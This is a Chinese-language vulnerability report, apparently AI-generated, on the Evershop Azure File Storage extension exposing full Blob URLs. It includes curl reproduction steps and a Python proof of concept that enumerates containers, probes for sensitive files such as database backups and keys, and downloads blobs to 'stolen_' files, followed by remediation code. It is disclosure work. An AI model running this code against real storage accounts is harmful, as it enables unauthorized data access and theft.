# Evershop Azure Blob URL 信息泄露漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform - Azure File Storage Extension
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：敏感信息泄露 (CWE-200) / 安全配置错误 (CWE-16)
- **漏洞名称**：Evershop Azure File Storage 直接暴露Blob URL信息泄露漏洞
- **风险等级**：中危
- **概述**：Azure File Storage扩展在上传和浏览文件时，直接返回完整的Azure Blob Storage URL给客户端。这暴露了存储账户名称、容器名称和完整的Blob路径，使攻击者可以直接访问存储资源或进行针对性攻击。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：能够访问上传/浏览API的用户
- **操作条件**：
  1. 系统使用Azure File Storage扩展
  2. 容器配置为公开访问（`access: "blob"`）
- **攻击特征**：从API响应中提取Azure存储URL

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **存储账户暴露**：攻击者获知Azure存储账户名称
2. **容器名称泄露**：获知Blob容器名称
3. **直接访问**：可构造URL直接访问任意Blob（如果公开）
4. **攻击面扩大**：为存储账户的进一步攻击提供信息

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位信息泄露点**

文件：`extensions/azure_file_storage/src/services/azureFileUploader.ts`
```typescript
uploadedFiles.push({
  name: file.filename,
  mimetype: file.mimetype,
  size: file.size,
  url: blobClient.url,  // <-- 直接返回完整Blob URL
});
```

文件：`extensions/azure_file_storage/src/services/azureFileBrowser.ts`
```typescript
files.push({
  name: relativePath,
  url: blobUrl,  // <-- 直接返回完整Blob URL
});
```

**步骤2：分析泄露的URL格式**

```
https://{storage-account}.blob.core.windows.net/{container}/{blob-path}
```

示例：
```
https://evershopstorage.blob.core.windows.net/images/products/product1.jpg
```

泄露信息：
- 存储账户名：`evershopstorage`
- 容器名：`images`
- Blob路径：`products/product1.jpg`

**步骤3：利用泄露信息**

```bash
# 上传文件获取URL
curl -X POST 'https://target.com/api/upload' \
  -F 'files=@test.jpg' \
  -F 'path=test'

# 响应中包含完整Azure URL
{
  "data": [
    {
      "name": "test.jpg",
      "url": "https://evershopstorage.blob.core.windows.net/images/test/test.jpg"
    }
  ]
}

# 攻击者可以直接访问
curl 'https://evershopstorage.blob.core.windows.net/images/test/test.jpg'
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Azure URL Information Disclosure PoC
"""

import requests
import re
from urllib.parse import urlparse

class AzureInfoExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.storage_account = None
        self.container_name = None
        self.discovered_blobs = []

    def extract_from_upload(self, file_path):
        """
        通过上传文件提取Azure存储信息
        """
        endpoint = f"{self.target_url}/api/upload"

        with open(file_path, 'rb') as f:
            files = {'files': ('test.jpg', f, 'image/jpeg')}
            data = {'path': 'test'}
            response = requests.post(endpoint, files=files, data=data)

        if response.status_code == 200:
            data = response.json()
            for file_info in data.get('data', []):
                url = file_info.get('url')
                if url:
                    self._parse_azure_url(url)
                    self.discovered_blobs.append(url)

        return self.storage_account, self.container_name

    def extract_from_browse(self, path=""):
        """
        通过浏览API提取Azure存储信息
        """
        endpoint = f"{self.target_url}/api/files/browse"
        params = {'path': path}

        response = requests.get(endpoint, params=params)

        if response.status_code == 200:
            data = response.json()
            for file_info in data.get('files', []):
                url = file_info.get('url')
                if url:
                    self._parse_azure_url(url)
                    self.discovered_blobs.append(url)

        return self.discovered_blobs

    def _parse_azure_url(self, url):
        """
        解析Azure Blob URL提取信息
        """
        # https://{account}.blob.core.windows.net/{container}/{path}
        parsed = urlparse(url)

        if 'blob.core.windows.net' in parsed.netloc:
            self.storage_account = parsed.netloc.split('.')[0]
            path_parts = parsed.path.strip('/').split('/', 1)
            if path_parts:
                self.container_name = path_parts[0]

            print(f"[+] Azure存储账户: {self.storage_account}")
            print(f"[+] 容器名称: {self.container_name}")
            print(f"[+] Blob路径: {parsed.path}")

    def enumerate_container(self):
        """
        尝试枚举容器中的所有公开Blob
        """
        if not self.storage_account or not self.container_name:
            print("[-] 未发现存储信息")
            return []

        # 尝试列出容器（需要容器公开访问）
        list_url = f"https://{self.storage_account}.blob.core.windows.net/{self.container_name}?restype=container&comp=list"

        print(f"\n[*] 尝试枚举容器: {list_url}")
        response = requests.get(list_url)

        if response.status_code == 200:
            print("[+] 容器可公开列出!")
            # 解析XML响应获取Blob列表
            blobs = re.findall(r'<Name>([^<]+)</Name>', response.text)
            print(f"[+] 发现 {len(blobs)} 个Blob")
            return blobs
        else:
            print(f"[-] 容器列表访问被拒绝: {response.status_code}")
            return []

    def check_blob_access(self, blob_path):
        """
        检查Blob是否可直接访问
        """
        url = f"https://{self.storage_account}.blob.core.windows.net/{self.container_name}/{blob_path}"

        response = requests.head(url)

        if response.status_code == 200:
            print(f"[+] Blob可访问: {blob_path}")
            return True
        else:
            print(f"[-] Blob不可访问: {blob_path} ({response.status_code})")
            return False


def main():
    target = "https://shop.example.com"

    extractor = AzureInfoExtractor(target)

    print("=" * 60)
    print(" Azure URL Information Disclosure PoC")
    print("=" * 60)
    print()

    # 1. 通过浏览API提取信息
    print("[*] 从文件浏览API提取Azure信息...")
    extractor.extract_from_browse()

    if extractor.storage_account:
        print(f"\n[!] 发现Azure存储配置:")
        print(f"    账户: {extractor.storage_account}")
        print(f"    容器: {extractor.container_name}")

        # 2. 尝试枚举容器
        print("\n[*] 尝试枚举公开Blob...")
        blobs = extractor.enumerate_container()

        # 3. 检查敏感文件访问
        sensitive_paths = [
            "config/database.json",
            "backups/latest.sql",
            "private/admin.key",
        ]

        print("\n[*] 检查敏感文件访问...")
        for path in sensitive_paths:
            extractor.check_blob_access(path)


if __name__ == "__main__":
    main()
```

### 4.2 直接访问攻击

```python
def direct_access_attack(storage_account, container, known_paths):
    """
    使用泄露的URL信息直接访问存储
    """
    for path in known_paths:
        url = f"https://{storage_account}.blob.core.windows.net/{container}/{path}"
        response = requests.get(url)

        if response.status_code == 200:
            print(f"[+] 成功下载: {path}")
            with open(f"stolen_{path.replace('/', '_')}", 'wb') as f:
                f.write(response.content)
        else:
            print(f"[-] 访问失败: {path}")
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Azure URL 信息泄露数据流                            │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌─────────────────────────────────────────┐                  │
│  │ azureFileUploader / azureFileBrowser    │                  │
│  │                                         │                  │
│  │ const blobClient = containerClient      │                  │
│  │   .getBlockBlobClient(path);            │                  │
│  │                                         │                  │
│  │ // blobClient.url 包含完整信息:         │                  │
│  │ // https://account.blob.core...         │                  │
│  │                                         │                  │
│  │ return { url: blobClient.url };         │  ← 直接暴露     │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ HTTP响应                                 │                  │
│  │                                         │                  │
│  │ {                                       │                  │
│  │   "url": "https://evershopstorage       │                  │
│  │          .blob.core.windows.net         │  ← 账户名泄露   │
│  │          /images                        │  ← 容器名泄露   │
│  │          /products/item.jpg"            │  ← 路径泄露     │
│  │ }                                       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 攻击者获得信息后:                         │                  │
│  │                                         │                  │
│  │ 1. 直接访问已知Blob                      │                  │
│  │ 2. 尝试枚举容器内容                       │                  │
│  │ 3. 构造URL访问其他文件                    │                  │
│  │ 4. 进行存储账户级别攻击                   │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **过度信息暴露**：API直接返回内部存储URL
2. **缺乏URL代理**：未通过应用代理访问存储资源
3. **公开容器访问**：容器配置为`access: "blob"`允许公开访问

## 6. 修复建议

### 6.1 方案A：使用签名URL

```typescript
import { generateBlobSASQueryParameters, BlobSASPermissions } from "@azure/storage-blob";

function generateSignedUrl(blobClient: BlobClient, expiryMinutes: number = 60): string {
  const sasToken = generateBlobSASQueryParameters(
    {
      containerName: containerName,
      blobName: blobClient.name,
      permissions: BlobSASPermissions.parse("r"),  // 只读
      expiresOn: new Date(Date.now() + expiryMinutes * 60 * 1000),
    },
    sharedKeyCredential
  ).toString();

  return `${blobClient.url}?${sasToken}`;
}
```

### 6.2 方案B：代理访问

```typescript
// 返回代理URL而非直接Azure URL
uploadedFiles.push({
  name: file.filename,
  url: `/api/files/download/${encodeURIComponent(blobPath)}`,  // 代理端点
});

// 代理端点实现
app.get('/api/files/download/:path', async (req, res) => {
  const path = decodeURIComponent(req.params.path);

  // 验证用户权限
  if (!canAccessFile(req.user, path)) {
    return res.status(403).send('Access denied');
  }

  // 从Azure获取文件并流式返回
  const blobClient = containerClient.getBlobClient(path);
  const downloadResponse = await blobClient.download();
  downloadResponse.readableStreamBody.pipe(res);
});
```

### 6.3 方案C：私有容器

```typescript
// 将容器设为私有
await containerClient.createIfNotExists({
  access: undefined  // 私有访问，移除 "blob"
});

// 所有访问必须通过签名URL或代理
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
